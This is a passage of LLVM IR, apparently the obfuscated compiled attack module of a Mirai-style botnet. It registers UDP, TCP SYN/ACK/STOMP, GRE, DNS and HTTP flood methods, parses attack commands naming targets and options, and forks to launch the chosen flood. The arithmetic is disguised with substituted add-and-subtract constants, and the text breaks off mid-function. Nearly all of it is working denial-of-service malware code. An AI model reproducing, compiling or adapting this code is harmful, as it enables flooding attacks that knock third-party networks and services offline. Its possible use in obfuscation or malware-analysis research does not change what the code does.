; ModuleID = 'host/ir_sub/L33t.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 %17, 1641134593
  %19 = add i32 %18, 1
  %20 = add i32 %19, 1641134593
  %21 = add nsw i32 %17, 1
  %22 = sext i32 %20 to i64
  %23 = mul i64 %22, 8
  %24 = call i8* @realloc(i8* %15, i64 %23) #6
  %25 = bitcast i8* %24 to %struct.attack_method**
  store %struct.attack_method** %25, %struct.attack_method*** @methods, align 8
  %26 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %27 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %28 = load i8, i8* @methods_len, align 1
  %29 = sub i8 0, 1
  %30 = sub i8 %28, %29
  %31 = add i8 %28, 1
  store i8 %30, i8* @methods_len, align 1
  %32 = zext i8 %28 to i64
  %33 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %27, i64 %32
  store %struct.attack_method* %26, %struct.attack_method** %33, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %249

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 0, 4
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 4
  %29 = trunc i64 %27 to i32
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %17
  br label %249

; <label>:33:                                     ; preds = %17
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = add i64 %38, -3666161208294440266
  %40 = sub i64 %39, 1
  %41 = sub i64 %40, -3666161208294440266
  %42 = sub i64 %38, 1
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %33
  br label %249

; <label>:47:                                     ; preds = %33
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %8, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = add i64 %52, -1490237735693888844
  %54 = sub i64 %53, 1
  %55 = sub i64 %54, -1490237735693888844
  %56 = sub i64 %52, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %4, align 4
  %58 = load i8, i8* %8, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %47
  br label %249

; <label>:62:                                     ; preds = %47
  %63 = load i32, i32* %4, align 4
  %64 = sext i32 %63 to i64
  %65 = load i8, i8* %8, align 1
  %66 = zext i8 %65 to i64
  %67 = mul i64 5, %66
  %68 = icmp ult i64 %64, %67
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %62
  br label %249

; <label>:70:                                     ; preds = %62
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i64
  %73 = call noalias i8* @calloc(i64 %72, i64 24) #6
  %74 = bitcast i8* %73 to %struct.attack_target*
  store %struct.attack_target* %74, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %75

; <label>:75:                                     ; preds = %125, %70
  %76 = load i32, i32* %5, align 4
  %77 = load i8, i8* %8, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp slt i32 %76, %78
  br i1 %79, label %80, label %131

; <label>:80:                                     ; preds = %75
  %81 = load i8*, i8** %3, align 8
  %82 = bitcast i8* %81 to i32*
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 1
  store i32 %83, i32* %88, align 4
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 4
  store i8* %90, i8** %3, align 8
  %91 = load i8*, i8** %3, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %3, align 8
  %93 = load i8, i8* %91, align 1
  %94 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 2
  store i8 %93, i8* %98, align 4
  %99 = load i32, i32* %4, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 %100, -6685273363404583459
  %102 = sub i64 %101, 5
  %103 = add i64 %102, -6685273363404583459
  %104 = sub i64 %100, 5
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %4, align 4
  %106 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %106, i64 %108
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %109, i32 0, i32 0
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %110, i32 0, i32 0
  store i16 2, i16* %111, align 4
  %112 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %112, i64 %114
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i32 0, i32 1
  %117 = load i32, i32* %116, align 4
  %118 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i64 %120
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %121, i32 0, i32 0
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %122, i32 0, i32 2
  %124 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %123, i32 0, i32 0
  store i32 %117, i32* %124, align 4
  br label %125

; <label>:125:                                    ; preds = %80
  %126 = load i32, i32* %5, align 4
  %127 = add i32 %126, -1074467905
  %128 = add i32 %127, 1
  %129 = sub i32 %128, -1074467905
  %130 = add nsw i32 %126, 1
  store i32 %129, i32* %5, align 4
  br label %75

; <label>:131:                                    ; preds = %75
  %132 = load i32, i32* %4, align 4
  %133 = sext i32 %132 to i64
  %134 = icmp ult i64 %133, 1
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %131
  br label %249

; <label>:136:                                    ; preds = %131
  %137 = load i8*, i8** %3, align 8
  %138 = getelementptr inbounds i8, i8* %137, i32 1
  store i8* %138, i8** %3, align 8
  %139 = load i8, i8* %137, align 1
  store i8 %139, i8* %9, align 1
  %140 = load i32, i32* %4, align 4
  %141 = sext i32 %140 to i64
  %142 = sub i64 %141, 2419367351050383467
  %143 = sub i64 %142, 1
  %144 = add i64 %143, 2419367351050383467
  %145 = sub i64 %141, 1
  %146 = trunc i64 %144 to i32
  store i32 %146, i32* %4, align 4
  %147 = load i8, i8* %9, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp sgt i32 %148, 0
  br i1 %149, label %150, label %241

; <label>:150:                                    ; preds = %136
  %151 = load i8, i8* %9, align 1
  %152 = zext i8 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 16) #6
  %154 = bitcast i8* %153 to %struct.attack_option*
  store %struct.attack_option* %154, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %155

; <label>:155:                                    ; preds = %235, %150
  %156 = load i32, i32* %5, align 4
  %157 = load i8, i8* %9, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  br i1 %159, label %160, label %240

; <label>:160:                                    ; preds = %155
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %160
  br label %249

; <label>:165:                                    ; preds = %160
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  %169 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %172, i32 0, i32 1
  store i8 %168, i8* %173, align 8
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = add i64 %175, 3749624174564776247
  %177 = sub i64 %176, 1
  %178 = sub i64 %177, 3749624174564776247
  %179 = sub i64 %175, 1
  %180 = trunc i64 %178 to i32
  store i32 %180, i32* %4, align 4
  %181 = load i32, i32* %4, align 4
  %182 = sext i32 %181 to i64
  %183 = icmp ult i64 %182, 1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %165
  br label %249

; <label>:185:                                    ; preds = %165
  %186 = load i8*, i8** %3, align 8
  %187 = getelementptr inbounds i8, i8* %186, i32 1
  store i8* %187, i8** %3, align 8
  %188 = load i8, i8* %186, align 1
  store i8 %188, i8* %12, align 1
  %189 = load i32, i32* %4, align 4
  %190 = sext i32 %189 to i64
  %191 = sub i64 0, 1
  %192 = add i64 %190, %191
  %193 = sub i64 %190, 1
  %194 = trunc i64 %192 to i32
  store i32 %194, i32* %4, align 4
  %195 = load i32, i32* %4, align 4
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp slt i32 %195, %197
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %185
  br label %249

; <label>:200:                                    ; preds = %185
  %201 = load i8, i8* %12, align 1
  %202 = zext i8 %201 to i32
  %203 = sub i32 %202, 1621714913
  %204 = add i32 %203, 1
  %205 = add i32 %204, 1621714913
  %206 = add nsw i32 %202, 1
  %207 = sext i32 %205 to i64
  %208 = call noalias i8* @calloc(i64 %207, i64 1) #6
  %209 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i32 0, i32 0
  store i8* %208, i8** %213, align 8
  %214 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %217, i32 0, i32 0
  %219 = load i8*, i8** %218, align 8
  %220 = load i8*, i8** %3, align 8
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  call void @util_memcpy(i8* %219, i8* %220, i32 %222)
  %223 = load i8, i8* %12, align 1
  %224 = zext i8 %223 to i32
  %225 = load i8*, i8** %3, align 8
  %226 = sext i32 %224 to i64
  %227 = getelementptr inbounds i8, i8* %225, i64 %226
  store i8* %227, i8** %3, align 8
  %228 = load i8, i8* %12, align 1
  %229 = zext i8 %228 to i32
  %230 = load i32, i32* %4, align 4
  %231 = add i32 %230, 15499007
  %232 = sub i32 %231, %229
  %233 = sub i32 %232, 15499007
  %234 = sub nsw i32 %230, %229
  store i32 %233, i32* %4, align 4
  br label %235

; <label>:235:                                    ; preds = %200
  %236 = load i32, i32* %5, align 4
  %237 = sub i32 0, 1
  %238 = sub i32 %236, %237
  %239 = add nsw i32 %236, 1
  store i32 %238, i32* %5, align 4
  br label %155

; <label>:240:                                    ; preds = %155
  br label %241

; <label>:241:                                    ; preds = %240, %136
  %242 = call i32* @__errno_location() #7
  store i32 0, i32* %242, align 4
  %243 = load i32, i32* %6, align 4
  %244 = load i8, i8* %7, align 1
  %245 = load i8, i8* %8, align 1
  %246 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %247 = load i8, i8* %9, align 1
  %248 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %243, i8 zeroext %244, i8 zeroext %245, %struct.attack_target* %246, i8 zeroext %247, %struct.attack_option* %248)
  br label %249

; <label>:249:                                    ; preds = %241, %199, %184, %164, %135, %69, %61, %46, %32, %16
  %250 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %251 = icmp ne %struct.attack_target* %250, null
  br i1 %251, label %252, label %255

; <label>:252:                                    ; preds = %249
  %253 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %254 = bitcast %struct.attack_target* %253 to i8*
  call void @free(i8* %254) #6
  br label %255

; <label>:255:                                    ; preds = %252, %249
  %256 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %257 = icmp ne %struct.attack_option* %256, null
  br i1 %257, label %258, label %262

; <label>:258:                                    ; preds = %255
  %259 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %260 = load i8, i8* %9, align 1
  %261 = zext i8 %260 to i32
  call void @free_opts(%struct.attack_option* %259, i32 %261)
  br label %262

; <label>:262:                                    ; preds = %258, %255
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %14, align 4
  %25 = load i8, i8* @methods_len, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp slt i32 %24, %26
  br i1 %27, label %28, label %60

; <label>:28:                                     ; preds = %23
  %29 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %29, i64 %31
  %33 = load %struct.attack_method*, %struct.attack_method** %32, align 8
  %34 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %33, i32 0, i32 1
  %35 = load i8, i8* %34, align 8
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* %8, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %28
  %41 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %42 = load i32, i32* %14, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %41, i64 %43
  %45 = load %struct.attack_method*, %struct.attack_method** %44, align 8
  %46 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %45, i32 0, i32 0
  %47 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = load i32, i32* %7, align 4
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %51 = load i8, i8* %11, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %47(i32 %48, i8 zeroext %49, %struct.attack_target* %50, i8 zeroext %51, %struct.attack_option* %52)
  br label %60

; <label>:53:                                     ; preds = %28
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %14, align 4
  %56 = add i32 %55, -250600388
  %57 = add i32 %56, 1
  %58 = sub i32 %57, -250600388
  %59 = add nsw i32 %55, 1
  store i32 %58, i32* %14, align 4
  br label %23

; <label>:60:                                     ; preds = %40, %23
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %38

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, 1
  %33 = sub i32 %31, %32
  %34 = add nsw i32 %31, 1
  store i32 %33, i32* %5, align 4
  br label %10

; <label>:35:                                     ; preds = %10
  %36 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %37 = bitcast %struct.attack_option* %36 to i8*
  call void @free(i8* %37) #6
  br label %38

; <label>:38:                                     ; preds = %35, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %42

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %44

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, %36
  %38 = sub i32 0, 1
  %39 = add i32 %37, %38
  %40 = sub i32 0, %39
  %41 = add nsw i32 %36, 1
  store i32 %40, i32* %10, align 4
  br label %11

; <label>:42:                                     ; preds = %11
  %43 = load i8*, i8** %9, align 8
  store i8* %43, i8** %5, align 8
  br label %44

; <label>:44:                                     ; preds = %42, %27
  %45 = load i8*, i8** %5, align 8
  ret i8* %45
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

